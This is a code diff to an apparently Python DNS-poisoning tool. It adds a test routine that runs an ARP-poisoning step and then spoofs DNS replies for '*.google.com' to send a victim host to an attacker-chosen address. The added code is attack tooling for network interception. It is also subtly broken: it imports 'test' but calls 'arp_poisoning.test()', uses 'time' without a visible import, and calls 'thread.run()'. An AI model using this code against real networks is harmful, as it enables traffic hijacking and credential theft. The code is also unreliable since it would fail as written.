@@ -4,6 +4,8 @@ import threading
 import os
 import re
 
+from arp_poisoning import test
+
 class DnsPoisoner():
 
     def __init__(self, ip_victim, queue_num):
@@ -84,3 +86,27 @@ class DnsPoisoner():
         self.queue.unbind()    #delete queue
 
         print "DNS poisoning attack stopped"
+
+def test_cb():
+
+    arp_poisoning.test()
+
+    ip_victim = "10.0.123.5"
+    ip_to_spoof = "10.0.123.4"
+    url_to_spoof = "*.google.com"
+
+    dns_poisoner = DnsPoisoner(ip_victim, 1)
+    dns_poisoner.add_url(url_to_spoof, ip_to_spoof)
+
+    dns_poisoner.start()
+    time.sleep(20)
+    dns_poisoner.stop()
+
+def test():
+
+    thread = threading.Thread(target=test_cb)
+    thread.run()
+
+if __name__ == "__main__":
+
+    test()
